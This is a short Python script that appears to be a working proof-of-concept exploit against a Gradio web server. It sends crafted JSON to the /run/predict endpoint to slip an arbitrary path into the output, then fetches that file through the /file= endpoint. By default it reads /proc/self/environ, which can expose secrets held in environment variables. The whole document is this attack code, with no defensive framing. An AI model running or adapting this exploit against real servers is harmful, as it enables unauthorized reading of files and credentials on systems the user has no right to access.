from argparse import ArgumentParser
from requests import Session

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--url", default="http://gradio:7860")
    parser.add_argument("--path", default="/proc/self/environ")
    args = parser.parse_args()

    with Session() as s:
        rsp = s.post(f"{args.url}/run/predict", json={
            "data" : [
                '{"can be": [{"anywhere" : [ 123, { "path" : "PATH" } ] }], "foo" : "bar" }'.replace("PATH", args.path)
            ],
            "fn_index" : 0
        })

        path = rsp.json()["data"][0]["can be"][0]["anywhere"][1]["path"]
        rsp = s.get(f"{args.url}/file={path}")

        try:
            print(rsp.content.decode())
        except UnicodeError:
            print(rsp.content)